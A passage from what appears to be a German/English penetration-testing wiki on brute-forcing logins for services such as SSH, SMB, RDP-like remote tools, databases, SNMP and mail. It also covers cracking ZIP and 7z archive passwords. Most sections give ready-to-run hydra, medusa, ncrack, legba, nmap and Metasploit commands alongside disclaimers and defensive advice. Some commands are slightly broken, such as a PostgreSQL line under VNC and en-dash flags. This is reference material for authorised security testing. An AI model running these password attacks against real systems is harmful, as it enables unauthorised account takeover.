Replace `<username>` with the target username, `<password_list>` with the path to a file containing a list of passwords, and `<target_ip>` with the IP address of the target system.

#### Countermeasures

To protect against brute force attacks on Rlogin, you can implement the following countermeasures:

- Use strong and complex passwords that are not easily guessable.
- Implement account lockout policies that temporarily lock an account after a certain number of failed login attempts.
- Monitor and analyze log files for any suspicious login activity.
- Disable or restrict Rlogin access if it is not necessary for your system.

Remember to always obtain proper authorization before performing any brute force attacks or penetration testing activities.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, it is important to note that Rsh is considered insecure due to its lack of encryption and authentication mechanisms.

#### Brute Forcing Rsh

Brute forcing Rsh involves systematically trying different combinations of usernames and passwords until the correct credentials are found. This can be done using tools like Hydra or Medusa, which automate the process of trying multiple login combinations.

To brute force Rsh, you need a wordlist containing possible usernames and passwords. These wordlists can be obtained from various sources, such as leaked databases or password cracking forums. Once you have a wordlist, you can use a tool like Hydra to automate the brute forcing process.

Here is an example command to brute force Rsh using Hydra:

```
hydra -L users.txt -P passwords.txt rsh://target_ip
```

In this command, `users.txt` is the file containing the list of usernames, `passwords.txt` is the file containing the list of passwords, and `target_ip` is the IP address of the remote system.

It is important to note that brute forcing Rsh is illegal and unethical unless you have explicit permission from the system owner to perform such actions. Always ensure that you are conducting any hacking activities within the boundaries of the law and with proper authorization.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync ist ein beliebtes Tool für die Dateisynchronisation und -übertragung in Unix-Systemen. Es ermöglicht das effiziente Kopieren und Synchronisieren von Dateien und Verzeichnissen sowohl lokal als auch über Netzwerke. Rsync verwendet den Rsync-Protokollalgorithmus, der inkrementelle Übertragungen ermöglicht, um nur die geänderten Teile von Dateien zu übertragen. Dies macht Rsync besonders nützlich für die Aktualisierung von Backups und das Spiegeln von Verzeichnissen.

Rsync kann auch für Brute-Force-Angriffe verwendet werden, um Benutzernamen und Passwörter zu erraten. Dies wird erreicht, indem Rsync verwendet wird, um eine Verbindung zu einem Remote-Host herzustellen und verschiedene Kombinationen von Benutzernamen und Passwörtern auszuprobieren, um sich anzumelden. Dieser Ansatz kann effektiv sein, wenn schwache oder vorhersehbare Passwörter verwendet werden.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind und ohne ausdrückliche Zustimmung des Eigentümers des Zielhosts nicht durchgeführt werden dürfen.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) ist ein Netzwerkprotokoll, das zur Steuerung von Streaming-Medien über IP-Netzwerke verwendet wird. Es ermöglicht die Übertragung von Audio- und Videodaten in Echtzeit. RTSP wird häufig für die Übertragung von Live-Streams, Video-on-Demand und anderen Multimedia-Anwendungen verwendet.

#### Brute-Force-Angriff auf RTSP

Ein Brute-Force-Angriff auf RTSP beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein RTSP-System zu erlangen. Dieser Angriff kann verwendet werden, um Schwachstellen in der Authentifizierung zu identifizieren und Zugriff auf geschützte RTSP-Streams zu erhalten.

Um einen Brute-Force-Angriff auf RTSP durchzuführen, können verschiedene Tools und Skripte verwendet werden, die automatisch Benutzernamen und Passwörter ausprobieren. Es ist wichtig, eine Liste mit häufig verwendeten Benutzernamen und Passwörtern zu haben, um die Erfolgschancen des Angriffs zu erhöhen.

Es ist jedoch zu beachten, dass Brute-Force-Angriffe illegal sind, es sei denn, sie werden im Rahmen einer autorisierten Penetrationstest durchgeführt. Es ist wichtig, die Zustimmung des Eigentümers des RTSP-Systems einzuholen, bevor ein Brute-Force-Angriff durchgeführt wird.

#### Schutz vor Brute-Force-Angriffen auf RTSP

Um sich vor Brute-Force-Angriffen auf RTSP zu schützen, sollten starke und eindeutige Passwörter verwendet werden. Es wird empfohlen, Passwörter zu verwenden, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen. Darüber hinaus sollten Zugriffsbeschränkungen implementiert werden, um die Anzahl der fehlgeschlagenen Anmeldeversuche zu begrenzen und verdächtige Aktivitäten zu erkennen.

Es ist auch ratsam, regelmäßig die Sicherheitsrichtlinien und Empfehlungen des Herstellers zu überprüfen und sicherzustellen, dass das RTSP-System auf dem neuesten Stand ist. Durch regelmäßige Aktualisierungen und Patches können potenzielle Sicherheitslücken geschlossen werden.

Zusätzlich kann die Implementierung von Zwei-Faktor-Authentifizierung (2FA) den Schutz vor Brute-Force-Angriffen weiter verbessern. 2FA erfordert neben dem Passwort eine zusätzliche Authentifizierungsmethode, wie z.B. einen Einmalpasscode, der per SMS oder einer Authentifizierungs-App gesendet wird.

Durch die Kombination dieser Schutzmaßnahmen kann das Risiko von Brute-Force-Angriffen auf RTSP erheblich reduziert werden. Es ist wichtig, proaktiv zu sein und Sicherheitsvorkehrungen zu treffen, um die Integrität und Vertraulichkeit der übertragenen Medien zu gewährleisten.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) ist ein Netzwerkprotokoll, das verwendet wird, um Dateien sicher zwischen einem Client und einem Server zu übertragen. Im Gegensatz zu FTP (File Transfer Protocol) verwendet SFTP eine verschlüsselte Verbindung, um die Vertraulichkeit und Integrität der übertragenen Daten zu gewährleisten.

#### Brute-Force-Angriff auf SFTP

Ein Brute-Force-Angriff auf SFTP beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um sich Zugang zu einem SFTP-Server zu verschaffen. Dieser Angriff kann erfolgreich sein, wenn schwache oder vorhersehbare Zugangsdaten verwendet werden.

Um einen Brute-Force-Angriff auf SFTP durchzuführen, können verschiedene Tools und Skripte verwendet werden, die automatisch Benutzernamen und Passwörter ausprobieren. Es ist wichtig, starke und eindeutige Passwörter zu verwenden, um sich vor solchen Angriffen zu schützen.

#### Schutz vor Brute-Force-Angriffen auf SFTP

Um sich vor Brute-Force-Angriffen auf SFTP zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwendung von starken und eindeutigen Passwörtern für SFTP-Konten
- Aktivierung der Kontosperrung nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen
- Implementierung einer Zwei-Faktor-Authentifizierung für SFTP-Konten
- Überwachung von Anmeldeversuchen und verdächtigen Aktivitäten auf dem SFTP-Server
- Aktualisierung des SFTP-Servers und der verwendeten Software, um bekannte Sicherheitslücken zu schließen

Durch die Umsetzung dieser Schutzmaßnahmen kann das Risiko eines erfolgreichen Brute-Force-Angriffs auf SFTP erheblich reduziert werden.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) ist ein Protokoll, das zur Verwaltung und Überwachung von Netzwerkgeräten verwendet wird. Es ermöglicht die Kommunikation zwischen einem Netzwerkmanagement-System (NMS) und den verwalteten Geräten. SNMP verwendet eine Client-Server-Architektur, bei der das NMS als Client fungiert und die verwalteten Geräte als Server.

Ein potenzieller Angriffsvektor bei SNMP ist das Brute-Forcing von Community-Strings. Community-Strings sind Passwörter, die zur Authentifizierung und Autorisierung von SNMP-Anfragen verwendet werden. Angreifer können versuchen, diese Passwörter durch systematisches Ausprobieren aller möglichen Kombinationen zu erraten.

Um einen Brute-Force-Angriff auf SNMP durchzuführen, können verschiedene Tools wie SNMP-Brute oder Nmap verwendet werden. Diese Tools ermöglichen es dem Angreifer, eine Liste von Community-Strings zu erstellen und diese nacheinander auszuprobieren, um Zugriff auf das SNMP-System zu erlangen.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe auf SNMP illegal sind, es sei denn, sie werden im Rahmen einer autorisierten Penetrationstest durchgeführt. Es ist daher ratsam, solche Angriffe nur mit ausdrücklicher Genehmigung des Eigentümers des Netzwerks oder Systems durchzuführen.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) ist ein Protokoll, das in Windows-basierten Betriebssystemen verwendet wird, um Datei-, Drucker- und andere Ressourcen in einem Netzwerk freizugeben. Es ermöglicht Benutzern, auf gemeinsame Dateien und Ordner zuzugreifen und sie zu bearbeiten.

#### Brute-Force-Angriff auf SMB

Ein Brute-Force-Angriff auf SMB beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein SMB-System zu erlangen. Dies kann entweder manuell oder mithilfe von automatisierten Tools erfolgen.

#### Tools für Brute-Force-Angriffe auf SMB

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf SMB verwendet werden können, darunter Hydra, Medusa und SMBMap. Diese Tools ermöglichen es einem Angreifer, Benutzernamen und Passwörter aus einer vordefinierten Liste auszuprobieren, um Zugriff auf ein SMB-System zu erlangen.

#### Schutz vor Brute-Force-Angriffen auf SMB

Um sich vor Brute-Force-Angriffen auf SMB zu schützen, sollten starke Passwörter verwendet werden, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen. Es ist auch ratsam, die Anzahl der zulässigen Anmeldeversuche zu begrenzen und eine Zwei-Faktor-Authentifizierung zu implementieren, um die Sicherheit des SMB-Systems zu erhöhen.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) ist ein Protokoll, das für die Übertragung von E-Mails zwischen Servern verwendet wird. Es ermöglicht das Senden und Empfangen von E-Mails über das Internet.

#### Brute-Force-Angriff auf SMTP

Ein Brute-Force-Angriff auf SMTP beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um sich unbefugten Zugriff auf ein E-Mail-Konto zu verschaffen. Dieser Angriff kann verwendet werden, um Schwachstellen in der Authentifizierung zu identifizieren und Zugriff auf E-Mail-Konten zu erlangen.

#### Tools für Brute-Force-Angriffe auf SMTP

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf SMTP verwendet werden können. Einige beliebte Tools sind:

- Hydra: Ein leistungsstarkes Tool für Brute-Force-Angriffe, das verschiedene Protokolle unterstützt, einschließlich SMTP.
- Medusa: Ein weiteres Tool für Brute-Force-Angriffe, das auf Geschwindigkeit und Effizienz ausgelegt ist.
- Ncrack: Ein Netzwerk-Authentifizierung-Cracking-Tool, das auch für Brute-Force-Angriffe auf SMTP verwendet werden kann.

#### Schutz vor Brute-Force-Angriffen auf SMTP

Um sich vor Brute-Force-Angriffen auf SMTP zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwendung starker Passwörter: Verwenden Sie komplexe Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Begrenzung der Anzahl der Anmeldeversuche: Begrenzen Sie die Anzahl der Anmeldeversuche, um die Ausführung von Brute-Force-Angriffen zu erschweren.
- Zwei-Faktor-Authentifizierung (2FA): Aktivieren Sie die Zwei-Faktor-Authentifizierung, um zusätzliche Sicherheitsschichten hinzuzufügen.
- Überwachung der Anmeldeaktivitäten: Überwachen Sie die Anmeldeaktivitäten auf verdächtige Aktivitäten und ungewöhnliche Anmeldeversuche.

#### Fazit

Brute-Force-Angriffe auf SMTP können dazu führen, dass unbefugte Personen Zugriff auf E-Mail-Konten erhalten. Es ist wichtig, geeignete Sicherheitsmaßnahmen zu ergreifen, um solche Angriffe zu verhindern. Durch die Verwendung starker Passwörter, die Begrenzung der Anzahl der Anmeldeversuche und die Aktivierung der Zwei-Faktor-Authentifizierung können Sie die Sicherheit Ihres E-Mail-Kontos verbessern.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
SOCKS (Socket Secure) is a protocol that allows for the secure transmission of network traffic between a client and a server. It operates at the transport layer of the OSI model and can be used for various purposes, including bypassing firewalls and accessing restricted content.

#### SOCKS Proxy

A SOCKS proxy acts as an intermediary between a client and a server, forwarding network traffic between them. It can be used to hide the client's IP address and location, as well as to bypass network restrictions.

To use a SOCKS proxy, the client must be configured to connect to the proxy server. This can be done by specifying the proxy settings in the client's network configuration or by using a proxy management tool.

#### Brute Forcing SOCKS Credentials

Brute forcing SOCKS credentials involves attempting to guess the username and password combination used to authenticate with a SOCKS proxy server. This can be done by systematically trying different combinations until the correct credentials are found.

To brute force SOCKS credentials, various tools and scripts can be used. These tools automate the process of trying different username and password combinations, making it faster and more efficient.

It is important to note that brute forcing SOCKS credentials is an illegal activity and can result in severe consequences. It is only recommended to perform such actions in a controlled and authorized environment, such as during a penetration testing engagement.

#### Mitigating Brute Force Attacks

To mitigate brute force attacks against SOCKS credentials, several measures can be taken:

- Implementing account lockout policies: After a certain number of failed login attempts, the account can be locked, preventing further login attempts for a specified period of time.
- Enforcing strong password policies: Requiring users to choose complex and unique passwords can make it more difficult for attackers to guess the correct credentials.
- Implementing rate limiting: Limiting the number of login attempts per unit of time can slow down brute force attacks and make them less effective.
- Monitoring and logging: Keeping track of login attempts and monitoring for suspicious activity can help detect and respond to brute force attacks in a timely manner.

By implementing these measures, the risk of successful brute force attacks against SOCKS credentials can be significantly reduced.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server ist ein relationales Datenbankverwaltungssystem (RDBMS), das von Microsoft entwickelt wurde. Es wird häufig für die Speicherung und Verwaltung von Daten in Unternehmen verwendet. SQL Server bietet eine Vielzahl von Sicherheitsmechanismen, um unbefugten Zugriff auf Daten zu verhindern. 

#### Brute-Force-Angriffe auf SQL Server

Ein Brute-Force-Angriff auf SQL Server beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf das System zu erlangen. Dieser Angriff kann durchgeführt werden, wenn der Angreifer Zugriff auf den Anmeldedienst des SQL Servers hat.

#### Tools für Brute-Force-Angriffe auf SQL Server

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf SQL Server verwendet werden können. Einige beliebte Tools sind:

- **Hydra**: Ein leistungsstarkes Tool für Brute-Force-Angriffe, das verschiedene Protokolle unterstützt, einschließlich SQL Server.
- **Medusa**: Ein weiteres Tool, das für Brute-Force-Angriffe auf verschiedene Dienste, einschließlich SQL Server, verwendet werden kann.
- **Ncrack**: Ein Netzwerk-Authentifizierungscracker, der auch für Brute-Force-Angriffe auf SQL Server eingesetzt werden kann.

#### Schutz vor Brute-Force-Angriffen auf SQL Server

Um sich vor Brute-Force-Angriffen auf SQL Server zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter für Benutzerkonten auf dem SQL Server.
- Begrenzen Sie die Anzahl der Anmeldeversuche, um wiederholte Brute-Force-Angriffe zu verhindern.
- Aktivieren Sie die Kontosperre nach einer bestimmten Anzahl fehlgeschlagener Anmeldeversuche.
- Überwachen Sie die Anmeldungen auf verdächtige Aktivitäten und setzen Sie entsprechende Sicherheitsmaßnahmen um.

Es ist wichtig, die Sicherheit des SQL Servers regelmäßig zu überprüfen und sicherzustellen, dass alle erforderlichen Sicherheitsmaßnahmen implementiert sind, um Brute-Force-Angriffe zu verhindern.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) ist ein Netzwerkprotokoll, das verwendet wird, um sichere Verbindungen zu entfernten Systemen herzustellen und Daten sicher zu übertragen. Es wird häufig für die Fernverwaltung von Computern und das sichere Übertragen von Dateien verwendet.

#### Brute-Force-Angriff auf SSH

Ein Brute-Force-Angriff auf SSH beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein SSH-Konto zu erlangen. Dieser Angriff kann automatisiert werden, indem Tools wie Hydra, Medusa oder Patator verwendet werden.

#### Gegenmaßnahmen

Um sich vor Brute-Force-Angriffen auf SSH zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter oder besser noch, verwenden Sie öffentliche/private Schlüsselpaare für die Authentifizierung.
- Aktivieren Sie die Zwei-Faktor-Authentifizierung (2FA) für SSH.
- Begrenzen Sie die Anzahl der Anmeldeversuche pro Zeiteinheit.
- Verwenden Sie Tools wie fail2ban, um IP-Adressen von Angreifern zu blockieren.
- Aktualisieren Sie regelmäßig die SSH-Software, um bekannte Sicherheitslücken zu beheben.

#### Weitere Ressourcen

- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa](https://github.com/jmk-foofus/medusa)
- [Patator](https://github.com/lanjelot/patator)
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Schwache SSH-Schlüssel / Vorhersehbare PRNG von Debian

Einige Systeme weisen bekannte Schwachstellen im Zufallsseed auf, der zur Generierung kryptografischer Materialien verwendet wird. Dies kann zu einem dramatisch reduzierten Schlüsselraum führen, der mit Tools wie [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) per Brute-Force angegriffen werden kann. Vorgefertigte Sets schwacher Schlüssel sind ebenfalls verfügbar, wie z.B. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ und OpenMQ)

Das STOMP-Textprotokoll ist ein weit verbreitetes Messaging-Protokoll, das eine nahtlose Kommunikation und Interaktion mit beliebten Message-Queueing-Diensten wie RabbitMQ, ActiveMQ, HornetQ und OpenMQ ermöglicht. Es bietet einen standardisierten und effizienten Ansatz zum Austausch von Nachrichten und zur Durchführung verschiedener Messaging-Operationen.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet ist ein Netzwerkprotokoll, das verwendet wird, um eine Verbindung zu einem entfernten Computer herzustellen und eine interaktive Sitzung zu ermöglichen. Es ermöglicht einem Benutzer, Befehle an den entfernten Host zu senden und die Ausgabe zu empfangen. Telnet kann verwendet werden, um auf verschiedene Dienste wie SSH, FTP, SMTP und viele andere zuzugreifen.

#### Brute-Force-Angriff auf Telnet

Ein Brute-Force-Angriff auf Telnet beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein Telnet-Konto zu erlangen. Dieser Angriff kann mit automatisierten Tools durchgeführt werden, die eine große Anzahl von Kombinationen in kurzer Zeit ausprobieren können.

Um einen erfolgreichen Brute-Force-Angriff auf Telnet durchzuführen, ist es wichtig, eine Liste mit häufig verwendeten Benutzernamen und Passwörtern zu haben. Diese Liste kann aus öffentlich verfügbaren Datenlecks oder aus vorherigen erfolgreichen Angriffen stammen.

Es ist auch wichtig, die Anzahl der Versuche zu begrenzen, um eine Erkennung durch Sicherheitsmechanismen zu vermeiden. Einige Tools bieten die Möglichkeit, die Anzahl der Versuche pro Minute oder pro Stunde zu begrenzen, um dies zu erreichen.

Es ist zu beachten, dass das Durchführen eines Brute-Force-Angriffs auf ein Telnet-Konto illegal ist, es sei denn, es liegt eine ausdrückliche schriftliche Genehmigung des Eigentümers des Kontos vor. Es ist wichtig, ethische Richtlinien einzuhalten und nur autorisierte Tests durchzuführen.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) ist ein Remote-Desktop-Protokoll, das es Benutzern ermöglicht, den Desktop eines entfernten Computers über das Netzwerk anzuzeigen und zu steuern. Es wird häufig verwendet, um auf entfernte Systeme zuzugreifen und diese zu verwalten.

#### Brute-Force-Angriff auf VNC

Ein Brute-Force-Angriff auf VNC beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein VNC-System zu erlangen. Dieser Angriff kann erfolgreich sein, wenn schwache oder vorhersehbare Passwörter verwendet werden.

Um einen Brute-Force-Angriff auf VNC durchzuführen, können verschiedene Tools wie Hydra, Medusa oder Ncrack verwendet werden. Diese Tools automatisieren den Prozess des Ausprobierens von Benutzernamen und Passwörtern und können die Angriffszeit erheblich verkürzen.

Es ist wichtig zu beachten, dass ein Brute-Force-Angriff auf VNC illegal ist, es sei denn, Sie haben die ausdrückliche Erlaubnis des Eigentümers des Systems, auf das Sie zugreifen möchten. Es ist immer ratsam, ethische Hacking-Methoden anzuwenden und die erforderlichen Genehmigungen einzuholen, bevor Sie einen Brute-Force-Angriff durchführen.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) ist ein Dienst, der es ermöglicht, Remote-Verbindungen zu Windows-Systemen herzustellen und diese zu verwalten. Es basiert auf dem SOAP-Protokoll und verwendet standardmäßig den Port 5985 (HTTP) oder 5986 (HTTPS).

#### Brute-Force-Angriff auf Winrm

Ein Brute-Force-Angriff auf Winrm beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein Windows-System über Winrm zu erlangen. Dieser Angriff kann mit verschiedenen Tools automatisiert werden, wie z.B. Hydra oder Medusa.

Um einen Brute-Force-Angriff auf Winrm durchzuführen, sind folgende Schritte erforderlich:

1. Identifizieren Sie das Ziel: Finden Sie die IP-Adresse oder den Hostnamen des Windows-Systems, auf das Sie zugreifen möchten.

2. Wählen Sie ein Brute-Force-Tool: Wählen Sie ein geeignetes Tool aus, um den Angriff durchzuführen. Stellen Sie sicher, dass das Tool Winrm unterstützt.

3. Erstellen Sie eine Wörterbuch-Datei: Erstellen Sie eine Liste von Benutzernamen und Passwörtern, die Sie für den Angriff verwenden möchten. Diese Liste wird als Wörterbuch bezeichnet.

4. Starten Sie den Angriff: Führen Sie das Brute-Force-Tool aus und geben Sie die IP-Adresse oder den Hostnamen des Ziels sowie die Wörterbuch-Datei an. Das Tool wird automatisch verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobieren, um Zugriff auf das Windows-System zu erlangen.

5. Überwachen Sie den Angriff: Überwachen Sie den Fortschritt des Angriffs und notieren Sie sich erfolgreiche Zugriffsversuche.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind, es sei denn, Sie haben die ausdrückliche Erlaubnis des Eigentümers des Systems, auf das Sie zugreifen möchten.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Lokal

### Online-Datenbanken zum Knacken

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 mit/ohne ESS/SSP und mit beliebigem Challenge-Wert)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-Captures und Archive MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes und Datei-Hashes)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Überprüfen Sie dies, bevor Sie versuchen, einen Hash per Brute-Force zu knacken.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bekannter Plaintext-Zip-Angriff

Sie müssen den **Klartext** (oder einen Teil des Klartextes) **einer Datei kennen, die sich im verschlüsselten Zip befindet**. Sie können die **Dateinamen und die Größe der Dateien, die sich im verschlüsselten Zip befinden**, überprüfen, indem Sie **`7z l encrypted.zip`** ausführen.\
Laden Sie [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) von der Releases-Seite herunter.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Die 7z-Methode ist eine Brute-Force-Technik, die verwendet wird, um das Passwort eines 7z-Archivs zu knacken. Diese Methode basiert auf der systematischen Überprüfung aller möglichen Passwortkombinationen, bis das richtige Passwort gefunden wird.

Um diese Methode anzuwenden, benötigen Sie eine Brute-Force-Software, die speziell für das Knacken von 7z-Archiven entwickelt wurde. Es gibt verschiedene Tools, die diese Funktion bieten, wie z.B. "7z Cracker" oder "7z Password Recovery".

Bevor Sie mit dem Brute-Force-Angriff beginnen, sollten Sie einige Informationen über das Archiv sammeln, wie z.B. die Länge des Passworts, mögliche Zeichen oder Muster, die im Passwort enthalten sein könnten. Diese Informationen können Ihnen helfen, den Brute-Force-Prozess zu optimieren und die Erfolgschancen zu erhöhen.

Es ist wichtig zu beachten, dass der Brute-Force-Angriff auf 7z-Archive sehr zeitaufwändig sein kann, insbesondere wenn das Passwort lang und komplex ist. Es kann Stunden, Tage oder sogar Wochen dauern, bis das richtige Passwort gefunden wird. Daher ist es ratsam, diese Methode nur als letzten Ausweg zu verwenden, wenn alle anderen Optionen ausgeschöpft sind.

